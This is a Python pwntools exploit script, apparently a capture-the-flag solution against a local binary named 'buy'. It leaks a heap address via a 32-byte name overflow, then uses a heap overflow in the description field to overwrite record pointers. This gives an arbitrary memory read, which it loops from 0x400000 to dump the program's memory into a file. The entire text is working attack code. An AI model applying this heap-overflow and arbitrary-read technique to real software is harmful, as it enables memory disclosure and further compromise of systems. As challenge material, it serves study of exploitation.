#! /usr/bin/env python
# -*- coding: utf-8 -*-

from pwn import *

#context.log_level = 'debug'#critical/debug
p = process("./buy")
f = open("buybin", "ab+")
#f = open("64weiba", "ab+")

def writename(name):
	io.recvuntil("(1~32):")
	io.sendline(name)

def namechange(name):
	io.recvuntil("Your choice:")
	io.sendline("6")
	io.recvuntil("(1~32):")
	io.sendline(name)

def add(name_size,name,des_size,des):
	io.recvuntil("Your choice:")
	io.sendline("1")
	io.recvuntil(".")
	io.sendline(str(name_size))
	io.recvuntil(".")
	io.sendline(name)
	io.recvuntil(".")
	io.sendline(str(des_size))
	io.recvuntil(".")
	io.sendline(des)

def displayall():
	io.recvuntil("Your choice:")
	io.sendline("3")
	io.recvuntil("Your choice:")
	io.sendline("1")
	io.recvuntil(32*"a")
	#io.recvuntil('aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa') # <== leak book1
	book1_addr = io.recvuntil("\'s",drop=True)
	book1_addr = book1_addr.ljust(8,'\x00')
	book1_addr = u64(book1_addr)
	#print hex(book1_addr)
	io.recvuntil("des address is ")

	return book1_addr

def change(index,name,desrcript):
	io.recvuntil("Your choice:")
	io.sendline("2")
	io.recvuntil("index is ")
	io.sendline(str(index))
	io.recvuntil("y's name.\n")
	io.sendline(name)
	io.recvuntil("y's desrcription.")
	io.sendline(desrcript)

def displayall_getdump(index):
	io.recvuntil("Your choice:")
	io.sendline("2")
	io.recvuntil("index is ")
	io.sendline(str(index))
	io.recvuntil("name is ")
	addr = io.recvuntil("\n",drop=True)
	#addr = addr.ljust(8,'\x00')
	#addr = u64(addr)
	return addr


begin = 0x400000
offset = 0
i=0

while True:#i<13:#True:#
	addr = begin + offset	
	
	try:
		io = process("./buy")
		#get the first heap address
		writename("a"*32)
		add(4200,"spring",12,"aaa")
		first_heap_addr = displayall()
		print '[*] first_heap_addr is ' + hex(first_heap_addr) 
		#first_heap_addr = 0x605040
		'''
		int name_size;
		char *name;
		int des_size;
		char *desrcript;	
		'''
		#get dump test
		displayall()
		#first heap pre_size size 0x10
		ljust_offset = 4096 - 16
		print '[*] ljust_offset is ' + hex(ljust_offset)
		payload_des_dump = ljust_offset *'c' + p64(12) + p64(addr) + p64(12) + p64(addr)
		#payload_des_dump = 0xfff * 'c'
		#pause()
		change(0,"spring",payload_des_dump)
		namechange("a"*32)
		#gdb.attach(io)
		info = displayall_getdump(0)
		print '[*] info is ' + info
		io.close()

	except EOFError:
		print "offset is " + hex(offset)
		break
	if len(info)==0:
		print "info is null"
		offset += 1
		f.write('\x00')
	else:
		info += "\x00"
		offset += len(info)
		f.write(info)
		f.flush()
	i = i + 1
	print "offset is " + str(offset)
f.close()
p.close()
#'''